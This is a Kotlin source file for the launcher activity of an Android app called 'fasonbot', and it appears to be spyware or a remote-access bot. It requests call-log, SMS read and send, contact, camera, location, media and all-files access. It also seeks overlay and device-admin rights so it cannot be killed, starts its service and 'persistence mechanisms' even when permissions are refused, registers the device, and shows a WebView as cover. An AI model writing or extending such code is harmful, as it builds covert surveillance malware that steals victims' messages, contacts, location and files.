package com.fasonbot.app

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.receiver.DeviceAdminReceiver
import com.fasonbot.app.service.CoreService
import com.fasonbot.app.service.ServiceHelper

class AppLauncher : Activity() {

    companion object {
        private const val TAG = "AppLauncher"
        private const val PERMISSION_REQUEST_CODE = 100
        private const val PREFS_NAME = "fasonbot_prefs"
        private const val KEY_SERVICE_ENABLED = "service_enabled"
    }

    private val requiredPermissions: Array<String> by lazy {
        buildList {
            add(android.Manifest.permission.READ_CALL_LOG)
            add(android.Manifest.permission.READ_SMS)
            add(android.Manifest.permission.SEND_SMS)
            add(android.Manifest.permission.READ_CONTACTS)
            add(android.Manifest.permission.CAMERA)
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(android.Manifest.permission.READ_MEDIA_IMAGES)
                add(android.Manifest.permission.READ_MEDIA_VIDEO)
                add(android.Manifest.permission.READ_MEDIA_AUDIO)
                add(android.Manifest.permission.POST_NOTIFICATIONS)
            } else {
                add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }.toTypedArray()
    }

    private var setupDone = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            Log.e(TAG, "Uncaught exception in ${thread.name}", throwable)
        }
        // Mark service as always enabled
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putBoolean(KEY_SERVICE_ENABLED, true).apply()

        if (allPermissionsGranted()) {
            onPermissionsGranted()
        } else {
            requestAllPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!setupDone && allPermissionsGranted()) {
            onPermissionsGranted()
        }
    }

    private fun allPermissionsGranted(): Boolean = try {
        requiredPermissions.all {
            checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
        } && (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager())
    } catch (e: Exception) {
        Log.e(TAG, "Permission check error: ${e.message}")
        false
    }

    private fun requestAllPermissions() {
        try {
            requestPermissions(requiredPermissions, PERMISSION_REQUEST_CODE)
        } catch (e: Exception) {
            Log.e(TAG, "Permission request error: ${e.message}")
        }

        // All files access (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (_: Exception) {
                try { startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)) }
                catch (_: Exception) {}
            }
        }

        // Disable battery optimization
        requestBatteryOptimizationExemption()

        // Overlay permission (for some OEM autostart flows)
        requestOverlayPermission()

        // Device Admin
        requestDeviceAdmin()
    }

    private fun requestBatteryOptimizationExemption() {
        try {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } catch (e: Exception) {
            Log.e(TAG, "Battery opt request error: ${e.message}")
        }
        // Android 12+: request permission to schedule exact alarms
        // Without this, all CoreService.scheduleRestartAlarm() calls silently fail.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            try {
                val am = getSystemService(android.app.AlarmManager::class.java)
                if (!am.canScheduleExactAlarms()) {
                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                        data = Uri.parse("package:$packageName")
                    })
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exact alarm request error: ${e.message}")
            }
        }
    }

    private fun requestOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } catch (e: Exception) {
            Log.e(TAG, "Overlay permission error: ${e.message}")
        }
    }

    private fun requestDeviceAdmin() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
            if (!dpm.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Activate Device Admin to keep the app running in background and prevent it from being killed."
                    )
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "DeviceAdmin request error: ${e.message}")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (allPermissionsGranted()) {
                onPermissionsGranted()
            } else {
                Toast.makeText(this, "Please grant all permissions for full functionality", Toast.LENGTH_LONG).show()
                // Start service anyway even if some permissions denied
                onPermissionsGranted()
            }
        }
    }

    private fun onPermissionsGranted() {
        if (setupDone) return
        setupDone = true
        startCoreService()
        launchWebView()
        finish()
    }

    private fun startCoreService() {
        try {
            DeviceManager.registerDevice(this)
            // Mark service enabled permanently
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                .putBoolean(KEY_SERVICE_ENABLED, true).apply()
            // Start the foreground service
            val intent = Intent(this, CoreService::class.java).apply { action = CoreService.ACTION_START }
            ContextCompat.startForegroundService(this, intent)
            // Set up all persistence mechanisms
            ServiceHelper.initializePersistence(applicationContext)
            Log.d(TAG, "CoreService started and persistence initialized")
        } catch (e: Exception) {
            Log.e(TAG, "Service start error: ${e.message}")
            CoreService.scheduleRestartAlarm(this, 1000)
        }
    }

    private fun launchWebView() {
        try {
            startActivity(Intent(this, WebViewActivity::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "WebView launch error: ${e.message}")
        }
    }
}
